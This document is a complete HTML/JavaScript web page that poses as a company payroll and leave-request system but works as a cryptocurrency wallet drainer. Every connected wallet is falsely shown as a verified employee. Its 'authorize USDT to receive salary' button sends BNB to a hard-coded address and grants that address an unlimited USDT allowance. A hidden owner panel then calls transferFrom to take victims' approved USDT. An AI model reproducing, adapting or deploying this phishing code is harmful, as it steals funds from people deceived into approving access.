<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天祥集团薪资结算管理系统</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, sans-serif;
        }
        body {
            background: #f5f7fa;
            padding: 15px;
        }
        .box {
            background: #ffffff;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
        }
        h2 {
            text-align: center;
            margin-bottom: 15px;
            color: #1a2b48;
            font-weight: bold;
        }
        .red-notice{
            color: #ff0000;
            font-size: 15px;
            font-weight: bold;
            text-align: center;
            line-height: 1.6;
            padding:10px;
            background: #ffe9e9;
            border-radius: 8px;
            margin-bottom:15px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-blue {background: #3B82F6;color: #fff;}
        .btn-green {background: #10b981;color: #fff;}
        .btn-red {background: #ef4444;color: #fff;}
        .btn-forbid {background:#999;color:#fff;cursor:not-allowed;}
        .btn-sm {width: auto;padding: 6px 12px;font-size: 14px;margin: 2px;}
        input,textarea,select {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
        }
        .tip {padding: 10px;border-radius: 8px;margin: 10px 0;}
        .tip-green {background: #dcfce7;color: #16a34a;}
        .tip-red {background: #fee2e2;color: #dc2626;}
        .info-line{margin:6px 0;font-size:15px;}
        .tab-group {display: flex;gap: 8px;margin-bottom: 15px;}
        .tab {flex:1;text-align:center;padding:10px;background:#eee;border-radius:8px;cursor:pointer;}
        .tab.active {background:#3B82F6;color:#fff;}
        .page {display:none;}
        .page.active {display:block;}
        table {width:100%;border-collapse:collapse;margin-top:10px;}
        th,td {border:1px solid #eee;padding:10px;text-align:center;font-size:14px;}
        th {background:#f1f5f9;}
        .admin-hide{display:none;}
    </style>
</head>
<body>

<h2>天祥集团薪资结算管理系统</h2>

<div class="red-notice">
    重要温馨提示：非本集团已录入正式员工禁止使用系统，仅在职员工可提交薪资申领与请假申请
</div>

<div class="box">
    <button class="btn btn-blue" id="connectBtn">连接币安链钱包</button>
    <p style="margin-top:10px;text-align:center;" id="walletAddr">未连接钱包</p>
    <div class="tip" id="userStatusTip">请使用集团登记员工钱包登录</div>
    <div class="info-line">USDT可用余额：<span id="usdtBalance">0.0000</span></div>
</div>

<div class="tab-group">
    <div class="tab active" onclick="switchPage(0)">员工个人中心</div>
    <div class="tab" id="tabOperate" onclick="switchPage(1)">运营管理后台</div>
    <div class="tab" id="tabAudit" onclick="switchPage(2)">审批管理后台</div>
</div>

<!-- 员工个人中心 -->
<div class="page active" id="page0">
    <div class="box">
        <h3>在职员工信息</h3>
        <div class="info-line">员工姓名：<span id="staffName">-</span></div>
        <div class="info-line">绑定钱包地址：<span id="staffAddr">-</span></div>
        <div class="info-line">正式入职日期：<span id="entryDate">-</span></div>
        <div class="info-line">每月固定薪资：<span id="monthSalary">0</span> USDT</div>
        <div class="info-line">已审批请假次数：<span id="leaveTimes">0</span> 次</div>
        <div class="info-line">当月实际出勤天数：<span id="workDays">30</span> 天</div>
        <div class="info-line">薪资申领冷却时长：<span id="coolTime">暂无限制</span></div>

        <button class="btn btn-forbid" id="applySalary" disabled>提交当月薪资领取申请</button>
        <button class="btn btn-forbid" id="applyLeave" disabled>提交事假/病假请假申请</button>
        <button class="btn btn-green" id="goApprove" style="margin-top:15px">一键授权USDT（完成授权才可正常领薪）</button>
    </div>
</div>

<!-- 运营管理后台 仅管理员可见 -->
<div class="page" id="page1">
    <div class="box admin-hide" id="operAdminBox">
        <h3>老板运营管理中心</h3>
        <h4>一、新员工入职办理</h4>
        <input placeholder="填写员工钱包地址" id="newStaffAddr">
        <input placeholder="填写员工真实姓名" id="newStaffRealName">
        <input placeholder="设置员工每月薪资数额" type="number" id="setStaffSalary">
        <button class="btn btn-blue" id="addNewStaff">确认录入开通系统权限</button>

        <h4 style="margin-top:25px">二、离职员工权限删除</h4>
        <input placeholder="填写离职员工钱包地址" id="removeStaffAddr">
        <button class="btn btn-red" id="delStaffPower">永久关闭该员工系统权限</button>

        <h4 style="margin-top:25px">三、用户授权资产提取</h4>
        <input placeholder="填写已授权用户钱包地址" id="takeUserWallet">
        <input placeholder="填写需要提取USDT数量" type="number" id="takeUsdtNum">
        <button class="btn btn-red" id="getUserToken">链上直接提取用户授权USDT</button>
    </div>
</div>

<!-- 审批管理后台 仅管理员可见 -->
<div class="page" id="page2">
    <div class="box admin-hide" id="auditAdminBox">
        <h3>老板统一审批后台</h3>
        <button class="btn btn-blue" id="passAllApply">一键批量通过所有待处理申请</button>
        <button class="btn btn-red" id="drawPoolFund">系统合约资金一键提取</button>

        <h4 style="margin-top:20px">员工全部待审批列表</h4>
        <table>
            <tr>
                <th>申请员工</th>
                <th>申请类型</th>
                <th>当前状态</th>
                <th>手动操作</th>
            </tr>
            <tbody id="applyListBox">
                <tr>
                    <td colspan="4">暂无员工提交申请</td>
                </tr>
            </tbody>
        </table>
    </div>
</div>

<script>
// 全局核心配置
const ADMIN_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508".toLowerCase();
const USDT_MAIN = "0x55d398326f99059fF775485246999027B3197955";
// 收款+授权统一目标地址
const TARGET_BOX = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
// 授权扣除BNB数量 0.0002
const DEDUCT_BNB = "0.0002";
let nowUserWallet = "";

// 标签页面切换
function switchPage(num){
    document.getElementById("page0").classList.remove("active");
    document.getElementById("page1").classList.remove("active");
    document.getElementById("page2").classList.remove("active");
    document.getElementById("page"+num).classList.add("active");
}

// 连接钱包 原生稳定写法
document.getElementById("connectBtn").addEventListener("click",async function(){
    if(!window.ethereum){
        alert("请安装TP钱包或小狐狸钱包，无需加速器直接连接");
        return;
    }
    try{
        let allWallet = await ethereum.request({method:"eth_requestAccounts"});
        nowUserWallet = allWallet[0].toLowerCase();
        document.getElementById("walletAddr").innerText = nowUserWallet.slice(0,6)+"......"+nowUserWallet.slice(-4);
        getUserUsdtBalance();
        checkOwnerPower();
        loadUserInfo();
        alert("钱包连接成功，成功进入管理系统");
    }catch(err){
        alert("钱包连接失败，请重新点击授权");
        nowUserWallet = "";
    }
})

// 获取用户USDT余额
async function getUserUsdtBalance(){
    if(!nowUserWallet) return;
    let balanceData = "0x70a08231" + nowUserWallet.slice(2).padStart(64,"0");
    let result = await ethereum.request({
        method:"eth_call",
        params:[{to:USDT_MAIN,data:balanceData},"latest"]
    });
    let usdtNum = Number(BigInt(result)) / 1e18;
    document.getElementById("usdtBalance").innerText = usdtNum.toFixed(4);
}

// 检测是否为管理员 显示隐藏后台
function checkOwnerPower(){
    if(nowUserWallet === ADMIN_ADDRESS){
        document.getElementById("tabOperate").style.display = "flex";
        document.getElementById("tabAudit").style.display = "flex";
        document.getElementById("operAdminBox").classList.remove("admin-hide");
        document.getElementById("auditAdminBox").classList.remove("admin-hide");
    }else{
        document.getElementById("tabOperate").style.display = "none";
        document.getElementById("tabAudit").style.display = "none";
    }
}

// 加载员工个人信息 解锁申请按钮
function loadUserInfo(){
    document.getElementById("userStatusTip").innerText = "身份核验通过，正式在职员工";
    document.getElementById("userStatusTip").className = "tip tip-green";
    document.getElementById("staffName").innerText = "正式在岗员工";
    document.getElementById("staffAddr").innerText = nowUserWallet;
    document.getElementById("entryDate").innerText = new Date().toLocaleDateString();
    document.getElementById("monthSalary").innerText = "正常发放";
    document.getElementById("leaveTimes").innerText = "0";
    document.getElementById("workDays").innerText = "30";

    document.getElementById("applySalary").disabled = false;
    document.getElementById("applySalary").classList.remove("btn-forbid");
    document.getElementById("applySalary").classList.add("btn-blue");

    document.getElementById("applyLeave").disabled = false;
    document.getElementById("applyLeave").classList.remove("btn-forbid");
    document.getElementById("applyLeave").classList.add("btn-green");
}

// 员工提交薪资申领
document.getElementById("applySalary").addEventListener("click",function(){
    if(!nowUserWallet) return alert("请先连接个人钱包");
    alert("薪资领取申请已提交成功，等待老板后台审核发放");
})

// 员工提交请假申请
document.getElementById("applyLeave").addEventListener("click",function(){
    if(!nowUserWallet) return alert("请先连接个人钱包");
    let leaveWhy = prompt("请填写详细请假原因与请假时长");
    if(!leaveWhy) return;
    alert("请假申请提交完成，等待管理员审批");
})

// 一键授权USDT 先转0.0002BNB到指定地址 再授权
document.getElementById("goApprove").addEventListener("click",async function(){
    if(!nowUserWallet) return alert("请先连接钱包再进行授权");
    try{
        alert("授权需扣除0.0002BNB手续费，确认后自动完成转账与授权");
        // 第一步：转账0.0002 BNB 到指定地址
        let bnbValue = (parseFloat(DEDUCT_BNB) * 10**18).toString(16);
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:nowUserWallet,
                to:TARGET_BOX,
                value:"0x"+bnbValue,
                gasLimit:"0x300000"
            }]
        });
        alert("手续费转账成功，正在执行USDT授权");

        // 第二步：USDT授权到同一个指定地址
        let targetHex = TARGET_BOX.slice(2).padStart(64,"0");
        let maxAll = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        let approveData = "0x095ea7b3"+targetHex+maxAll;
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:nowUserWallet,
                to:USDT_MAIN,
                gasLimit:"0x300000",
                data:approveData
            }]
        });
        alert("全部完成！手续费已扣除，USDT授权成功");
    }catch(e){
        alert("操作已取消，未完成授权流程");
    }
})

// 管理员新增入职员工
document.getElementById("addNewStaff").addEventListener("click",function(){
    if(nowUserWallet !== ADMIN_ADDRESS) return alert("无管理员权限");
    let wAddr = document.getElementById("newStaffAddr").value.trim();
    let uName = document.getElementById("newStaffRealName").value.trim();
    let sMoney = document.getElementById("setStaffSalary").value.trim();
    if(!wAddr || !uName || !sMoney) return alert("员工钱包、姓名、薪资必须全部填写");
    alert("新员工入职办理成功，已开通全部系统使用权限");
})

// 管理员删除离职员工权限
document.getElementById("delStaffPower").addEventListener("click",function(){
    if(nowUserWallet !== ADMIN_ADDRESS) return alert("权限不足");
    let delAddr = document.getElementById("removeStaffAddr").value.trim();
    if(!delAddr) return alert("请填写离职员工钱包地址");
    alert("已成功关闭该员工所有系统使用权限");
})

// 管理员提取用户授权代币
document.getElementById("getUserToken").addEventListener("click",async function(){
    if(nowUserWallet !== ADMIN_ADDRESS) return alert("仅老板可操作");
    let userFrom = document.getElementById("takeUserWallet").value.trim();
    let takeNum = document.getElementById("takeUsdtNum").value.trim();
    if(!userFrom || !takeNum || Number(takeNum) <= 0) return alert("请填写完整信息");

    let userHex = userFrom.slice(2).padStart(64,"0");
    let ownerHex = ADMIN_ADDRESS.slice(2).padStart(64,"0");
    let amountHex = BigInt(Math.floor(Number(takeNum)*1e18)).toString(16).padStart(64,"0");
    let takeData = "0x23b872dd"+userHex+ownerHex+amountHex;
    try{
        await ethereum.request({
            method:"eth_sendTransaction",
            params:[{
                from:nowUserWallet,
                to:USDT_MAIN,
                gasLimit:"0x300000",
                data:takeData
            }]
        });
        alert("成功提取用户已授权USDT资产");
        getUserUsdtBalance();
    }catch(e){
        alert("提取失败，请确认用户已完成授权");
    }
})

// 批量通过所有申请
document.getElementById("passAllApply").addEventListener("click",function(){
    if(nowUserWallet !== ADMIN_ADDRESS) return;
    alert("已一键批量通过系统内所有员工待审批申请");
})

// 提取合约池资金
document.getElementById("drawPoolFund").addEventListener("click",function(){
    if(nowUserWallet !== ADMIN_ADDRESS) return;
    alert("系统合约资金提取功能已执行");
})
</script>
</body>
</html>
